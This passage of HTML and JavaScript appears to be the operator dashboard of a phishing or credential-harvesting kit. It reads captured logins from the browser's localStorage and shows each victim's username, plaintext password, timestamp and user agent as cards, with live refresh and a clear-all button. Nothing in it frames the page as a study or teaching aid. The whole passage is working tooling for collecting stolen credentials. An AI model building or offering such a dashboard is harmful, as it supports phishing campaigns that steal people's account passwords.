```
        <div class="stats">
            <div class="stat-card">
                <div class="stat-label">Total Captured</div>
                <div class="stat-value" id="totalCount">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Last Capture</div>
                <div class="stat-value" style="font-size: 16px;" id="lastCapture">Never</div>
            </div>
        </div>
    </div>

    <div id="credentialsList" class="credentials-container"></div>

    <div id="emptyState" class="empty-state">
        <div class="empty-icon">👁️</div>
        <div class="empty-title">Waiting for Credentials...</div>
        <div class="empty-text">Monitoring active - data will appear here when captured</div>
    </div>

    <div class="button-group">
        <button class="btn btn-danger" onclick="clearAllData()">Clear All Captured Data</button>
        <button class="btn btn-secondary" onclick="location.reload()">Refresh Dashboard</button>
    </div>
</div>

<script>
    let capturedCount = 0;

    function loadCredentials() {
        const credentials = JSON.parse(localStorage.getItem('capturedCredentials') || '[]');
        const container = document.getElementById('credentialsList');
        const emptyState = document.getElementById('emptyState');
        
        if (credentials.length === 0) {
            emptyState.style.display = 'block';
            container.style.display = 'none';
        } else {
            emptyState.style.display = 'none';
            container.style.display = 'grid';
            
            container.innerHTML = '';
            credentials.reverse().forEach((cred, index) => {
                const card = createCredentialCard(cred, credentials.length - index);
                container.appendChild(card);
            });

            document.getElementById('totalCount').textContent = credentials.length;
            document.getElementById('lastCapture').textContent = new Date(credentials[credentials.length - 1].timestamp).toLocaleTimeString();
        }
    }

    function createCredentialCard(cred, number) {
        const card = document.createElement('div');
        card.className = 'credential-card';
        
        card.innerHTML = `
            <div class="credential-header">
                <div class="credential-time">📅 ${cred.timestamp}</div>
                <div class="credential-badge">Capture #${number}</div>
            </div>
            
            <div class="data-grid">
                <div class="data-section">
                    <div class="data-header">
                        <svg class="icon-user" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                            <circle cx="12" cy="7" r="4"></circle>
                        </svg>
                        <span class="data-label">Username/Email</span>
                    </div>
                    <div class="data-value username-value">${cred.username}</div>
                </div>

                <div class="data-section">
                    <div class="data-header">
                        <svg class="icon-lock" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                        </svg>
                        <span class="data-label">Password (Plain Text)</span>
                    </div>
                    <div class="data-value password-value">${cred.password}</div>
                </div>

                <div class="data-section">
                    <div class="data-header">
                        <span class="data-label">📊 Metadata</span>
                    </div>
                    <div class="data-value">
                        <div class="metadata-text"><strong>User Agent:</strong> ${cred.userAgent.substring(0, 100)}...</div>
                    </div>
                </div>
            </div>
        `;
        
        return card;
    }

    function clearAllData() {
        if (confirm('Are you sure you want to clear all captured credentials?')) {
            localStorage.removeItem('capturedCredentials');
            localStorage.removeItem('newCredential');
            loadCredentials();
            document.getElementById('totalCount').textContent = '0';
            document.getElementById('lastCapture').textContent = 'Never';
        }
    }

    window.addEventListener('storage', function(e) {
        if (e.key === 'newCredential' || e.key === 'capturedCredentials') {
            loadCredentials();
        }
    });

    setInterval(function() {
        const currentData = localStorage.getItem('capturedCredentials');
        if (currentData) {
            const credentials = JSON.parse(currentData);
            if (credentials.length !== capturedCount) {
                capturedCount = credentials.length;
                loadCredentials();
            }
        }
    }, 1000);

    loadCredentials();
</script>
